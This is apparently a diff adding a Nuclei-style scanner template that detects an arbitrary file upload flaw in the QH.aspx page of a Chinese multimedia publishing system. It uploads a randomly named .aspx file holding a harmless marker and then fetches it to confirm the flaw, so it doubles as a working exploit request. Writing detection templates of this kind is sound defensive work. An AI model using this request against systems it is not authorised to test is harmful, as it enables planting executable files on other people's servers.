@@ -1,0 +1,63 @@
+id: poc-yaml-howfor-qh-aspx-anyfile-upload
+info:
+  name: 和丰多媒体信息发布系统 QH.aspx 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(4)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: "upload-file"
+    method: POST
+    path:
+      - "{{BaseURL}}/QH.aspx"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryeegvclmyurlotuey"
+    body: |-
+      ------WebKitFormBoundaryeegvclmyurlotuey
+      Content-Disposition: form-data; name="fileToUpload"; filename="{{t1}}.aspx"
+      Content-Type: application/octet-stream
+
+      {{t2}}
+      ------WebKitFormBoundaryeegvclmyurlotuey
+      Content-Disposition: form-data; name="action"
+
+      upload
+      ------WebKitFormBoundaryeegvclmyurlotuey
+      Content-Disposition: form-data; name="responderId"
+
+      ResourceNewResponder
+      ------WebKitFormBoundaryeegvclmyurlotuey
+      Content-Disposition: form-data; name="remotePath"
+
+      /opt/resources
+      ------WebKitFormBoundaryeegvclmyurlotuey--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"first": true'
+        part: body
+
+  - id: "verify-upload"
+    method: GET
+    path:
+      - "{{BaseURL}}/opt/resources/{{t1}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
